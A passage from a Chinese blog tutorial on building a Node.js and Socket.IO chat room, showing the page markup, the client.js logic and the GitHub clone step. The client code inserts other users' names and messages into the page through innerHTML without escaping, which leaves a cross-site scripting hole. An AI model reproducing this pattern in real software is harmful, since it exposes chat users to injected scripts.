class="name">span</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"doc"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"chat"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"message"</span> <span class="attr">class</span>=<span class="string">"message"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"onlinecount"</span> <span class="attr">style</span>=<span class="string">"background:#EFEFF4; font-size:12px; margin-top:10px; margin-left:10px; color:#666;"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"input-box"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"input"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">maxlength</span>=<span class="string">"140"</span> <span class="attr">placeholder</span>=<span class="string">"请输入聊天内容，按Ctrl提交"</span> <span class="attr">id</span>=<span class="string">"content"</span> <span class="attr">name</span>=<span class="string">"content"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"action"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">id</span>=<span class="string">"mjr_send"</span> <span class="attr">onclick</span>=<span class="string">"CHAT.submit();"</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"./client.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>上面的html内容本身没有什么好说的，我们主要看看里面的4个文件请求：<br>1、realtime.plhwin.com:3000/socket.io/socket.io.js<br>2、style.css<br>3、json3.min.js<br>4、client.js</p>
-<p>第1个JS是Socket.IO提供的客户端JS文件，在前面安装服务端的步骤中，当npm安装完socket.io并搭建起WebServer后，这个JS文件就可以正常访问了。<br>第2个style.css文件没什么好说的，就是样式文件而已。<br>第3个JS只在IE8以下版本的IE浏览器中加载，目的是让这些低版本的IE浏览器也能处理json，这是一个开源的JS，详见：<a href="http://bestiejs.github.io/json3/" target="_blank" rel="noopener">http://bestiejs.github.io/json3/</a><br>第4个client.js是完整的客户端的业务逻辑实现代码，它的内容如下：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> d = <span class="built_in">document</span>,</span><br><span class="line">    w = <span class="built_in">window</span>,</span><br><span class="line">    p = <span class="built_in">parseInt</span>,</span><br><span class="line">    dd = d.documentElement,</span><br><span class="line">    db = d.body,</span><br><span class="line">    dc = d.compatMode == <span class="string">'CSS1Compat'</span>,</span><br><span class="line">    dx = dc ? dd: db,</span><br><span class="line">    ec = <span class="built_in">encodeURIComponent</span>;</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">    w.CHAT = &#123;</span><br><span class="line">        msgObj:d.getElementById(<span class="string">"message"</span>),</span><br><span class="line">        screenheight:w.innerHeight ? w.innerHeight : dx.clientHeight,</span><br><span class="line">        username:<span class="literal">null</span>,</span><br><span class="line">        userid:<span class="literal">null</span>,</span><br><span class="line">        socket:<span class="literal">null</span>,</span><br><span class="line">        <span class="comment">//让浏览器滚动条保持在最低部</span></span><br><span class="line">        scrollToBottom:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            w.scrollTo(<span class="number">0</span>, <span class="keyword">this</span>.msgObj.clientHeight);</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="comment">//退出，本例只是一个简单的刷新</span></span><br><span class="line">        logout:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="comment">//this.socket.disconnect();</span></span><br><span class="line">            location.reload();</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="comment">//提交聊天消息内容</span></span><br><span class="line">        submit:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> content = d.getElementById(<span class="string">"content"</span>).value;</span><br><span class="line">            <span class="keyword">if</span>(content != <span class="string">''</span>)&#123;</span><br><span class="line">                <span class="keyword">var</span> obj = &#123;</span><br><span class="line">                    userid: <span class="keyword">this</span>.userid,</span><br><span class="line">                    username: <span class="keyword">this</span>.username,</span><br><span class="line">                    content: content</span><br><span class="line">                &#125;;</span><br><span class="line">                <span class="keyword">this</span>.socket.emit(<span class="string">'message'</span>, obj);</span><br><span class="line">                d.getElementById(<span class="string">"content"</span>).value = <span class="string">''</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;,</span><br><span class="line">        genUid:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Date</span>().getTime()+<span class="string">""</span>+<span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random()*<span class="number">899</span>+<span class="number">100</span>);</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="comment">//更新系统消息，本例中在用户加入、退出的时候调用</span></span><br><span class="line">        updateSysMsg:<span class="function"><span class="keyword">function</span>(<span class="params">o, action</span>)</span>&#123;</span><br><span class="line">            <span class="comment">//当前在线用户列表</span></span><br><span class="line">            <span class="keyword">var</span> onlineUsers = o.onlineUsers;</span><br><span class="line">            <span class="comment">//当前在线人数</span></span><br><span class="line">            <span class="keyword">var</span> onlineCount = o.onlineCount;</span><br><span class="line">            <span class="comment">//新加入用户的信息</span></span><br><span class="line">            <span class="keyword">var</span> user = o.user;</span><br><span class="line">                 </span><br><span class="line">            <span class="comment">//更新在线人数</span></span><br><span class="line">            <span class="keyword">var</span> userhtml = <span class="string">''</span>;</span><br><span class="line">            <span class="keyword">var</span> separator = <span class="string">''</span>;</span><br><span class="line">            <span class="keyword">for</span>(key <span class="keyword">in</span> onlineUsers) &#123;</span><br><span class="line">                <span class="keyword">if</span>(onlineUsers.hasOwnProperty(key))&#123;</span><br><span class="line">                    userhtml += separator+onlineUsers[key];</span><br><span class="line">                    separator = <span class="string">'、'</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            d.getElementById(<span class="string">"onlinecount"</span>).innerHTML = <span class="string">'当前共有 '</span>+onlineCount+<span class="string">' 人在线，在线列表：'</span>+userhtml;</span><br><span class="line">             </span><br><span class="line">            <span class="comment">//添加系统消息</span></span><br><span class="line">            <span class="keyword">var</span> html = <span class="string">''</span>;</span><br><span class="line">            html += <span class="string">'&lt;div class="msg-system"&gt;'</span>;</span><br><span class="line">            html += user.username;</span><br><span class="line">            html += (action == <span class="string">'login'</span>) ? <span class="string">' 加入了聊天室'</span> : <span class="string">' 退出了聊天室'</span>;</span><br><span class="line">            html += <span class="string">'&lt;/div&gt;'</span>;</span><br><span class="line">            <span class="keyword">var</span> section = d.createElement(<span class="string">'section'</span>);</span><br><span class="line">            section.className = <span class="string">'system J-mjrlinkWrap J-cutMsg'</span>;</span><br><span class="line">            section.innerHTML = html;</span><br><span class="line">            <span class="keyword">this</span>.msgObj.appendChild(section);  </span><br><span class="line">            <span class="keyword">this</span>.scrollToBottom();</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="comment">//第一个界面用户提交用户名</span></span><br><span class="line">        usernameSubmit:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">var</span> username = d.getElementById(<span class="string">"username"</span>).value;</span><br><span class="line">            <span class="keyword">if</span>(username != <span class="string">""</span>)&#123;</span><br><span class="line">                d.getElementById(<span class="string">"username"</span>).value = <span class="string">''</span>;</span><br><span class="line">                d.getElementById(<span class="string">"loginbox"</span>).style.display = <span class="string">'none'</span>;</span><br><span class="line">                d.getElementById(<span class="string">"chatbox"</span>).style.display = <span class="string">'block'</span>;</span><br><span class="line">                <span class="keyword">this</span>.init(username);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;,</span><br><span class="line">        init:<span class="function"><span class="keyword">function</span>(<span class="params">username</span>)</span>&#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">            客户端根据时间和随机数生成uid,这样使得聊天室用户名称可以重复。</span></span><br><span class="line"><span class="comment">            实际项目中，如果是需要用户登录，那么直接采用用户的uid来做标识就可以</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            <span class="keyword">this</span>.userid = <span class="keyword">this</span>.genUid();</span><br><span class="line">            <span class="keyword">this</span>.username = username;</span><br><span class="line">             </span><br><span class="line">            d.getElementById(<span class="string">"showusername"</span>).innerHTML = <span class="keyword">this</span>.username;</span><br><span class="line">            <span class="keyword">this</span>.msgObj.style.minHeight = (<span class="keyword">this</span>.screenheight - db.clientHeight + <span class="keyword">this</span>.msgObj.clientHeight) + <span class="string">"px"</span>;</span><br><span class="line">            <span class="keyword">this</span>.scrollToBottom();</span><br><span class="line">             </span><br><span class="line">            <span class="comment">//连接websocket后端服务器</span></span><br><span class="line">            <span class="keyword">this</span>.socket = io.connect(<span class="string">'ws://realtime.plhwin.com:3000'</span>);</span><br><span class="line">             </span><br><span class="line">            <span class="comment">//告诉服务器端有用户登录</span></span><br><span class="line">            <span class="keyword">this</span>.socket.emit(<span class="string">'login'</span>, &#123;<span class="attr">userid</span>:<span class="keyword">this</span>.userid, <span class="attr">username</span>:<span class="keyword">this</span>.username&#125;);</span><br><span class="line">             </span><br><span class="line">            <span class="comment">//监听新用户登录</span></span><br><span class="line">            <span class="keyword">this</span>.socket.on(<span class="string">'login'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">o</span>)</span>&#123;</span><br><span class="line">                CHAT.updateSysMsg(o, <span class="string">'login'</span>); </span><br><span class="line">            &#125;);</span><br><span class="line">             </span><br><span class="line">            <span class="comment">//监听用户退出</span></span><br><span class="line">            <span class="keyword">this</span>.socket.on(<span class="string">'logout'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">o</span>)</span>&#123;</span><br><span class="line">                CHAT.updateSysMsg(o, <span class="string">'logout'</span>);</span><br><span class="line">            &#125;);</span><br><span class="line">             </span><br><span class="line">            <span class="comment">//监听消息发送</span></span><br><span class="line">            <span class="keyword">this</span>.socket.on(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">                <span class="keyword">var</span> isme = (obj.userid == CHAT.userid) ? <span class="literal">true</span> : <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">var</span> contentDiv = <span class="string">'&lt;div&gt;'</span>+obj.content+<span class="string">'&lt;/div&gt;'</span>;</span><br><span class="line">                <span class="keyword">var</span> usernameDiv = <span class="string">'&lt;span&gt;'</span>+obj.username+<span class="string">'&lt;/span&gt;'</span>;</span><br><span class="line">                 </span><br><span class="line">                <span class="keyword">var</span> section = d.createElement(<span class="string">'section'</span>);</span><br><span class="line">                <span class="keyword">if</span>(isme)&#123;</span><br><span class="line">                    section.className = <span class="string">'user'</span>;</span><br><span class="line">                    section.innerHTML = contentDiv + usernameDiv;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    section.className = <span class="string">'service'</span>;</span><br><span class="line">                    section.innerHTML = usernameDiv + contentDiv;</span><br><span class="line">                &#125;</span><br><span class="line">                CHAT.msgObj.appendChild(section);</span><br><span class="line">                CHAT.scrollToBottom(); </span><br><span class="line">            &#125;);</span><br><span class="line"> </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">//通过“回车”提交用户名</span></span><br><span class="line">    d.getElementById(<span class="string">"username"</span>).onkeydown = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">        e = e || event;</span><br><span class="line">        <span class="keyword">if</span> (e.keyCode === <span class="number">13</span>) &#123;</span><br><span class="line">            CHAT.usernameSubmit();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">//通过“回车”提交信息</span></span><br><span class="line">    d.getElementById(<span class="string">"content"</span>).onkeydown = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">        e = e || event;</span><br><span class="line">        <span class="keyword">if</span> (e.keyCode === <span class="number">13</span>) &#123;</span><br><span class="line">            CHAT.submit();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure></p>
-<p>至此所有的编码开发工作全部完成了，在浏览器中打开<a href="http://demo.plhwin.com/chat/" target="_blank" rel="noopener">http://demo.plhwin.com/chat/</a>就可以看到效果了。<br>上面所有的客户端和服务端的代码可以从Github上获得，地址：<a href="https://github.com/plhwin/nodejs-socketio-chat" target="_blank" rel="noopener">https://github.com/plhwin/nodejs-socketio-chat</a><br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/plhwin/nodejs-socketio-chat.git</span><br></pre></td></tr></table></figure></p>
-<p>下载本地后有两个文件夹 client 和 server，client文件夹是客户端源码，可以放在Nginx/Apache的WebServer中，也可以放在Node.js的WebServer中。后面的server文件夹里的代码是websocket服务端代码，放在Node.js环境中，使用npm安装完 express 和 socket.io 后，node index.js 启动后端服务就可以了。</p>
-<p>本例只是一个简单的Demo，留下2个有关项目扩展的思考：<br>1、假设是一个在线客服系统，里面有许多的公司使用你的服务，每个公司自己的用户可以通过一个专属URL地址进入该公司的聊天室，聊天是一对一的，每个公司可以新建多个客服人员，每个客服人员可以同时和客户端的多个用户聊天。<br>2、又假设是一个在线WebIM系统，实现类似微信，qq的功能，客户端可以看到好友在线状态，在线列表，添加好友，删除好友，新建群组等，消息的发送除了支持基本的文字外，还能支持表情、图片和文件。</p>
-<p>转载自：<a href="http://www.plhwin.com/2014/05/28/nodejs-socketio/" target="_blank" rel="noopener">http://www.plhwin.com/2014/05/28/nodejs-socketio/</a></p>
-
-      
-    </div>
-
-  </div>
-
-  <div class="article-footer">
-    <div class="article-meta pull-left">
-
-    
-      
-
-    <span class="post-categories">
-      <i class="icon-categories"></i>
-        <a href="/categories/Web-开发/">Web 开发</a>
-    </span>
-    
-
-    
-
-    </div>
-
-    
-    <div class="article-meta pull-right">
-      <span>
-        <i class="icon-comments"></i>
-        <span>
-          <a href="/2015/09/29/使用Node.js+Socket.IO搭建WebSocket实时应用/#comment">评论</a>
         </span>
       </span>
     </div>
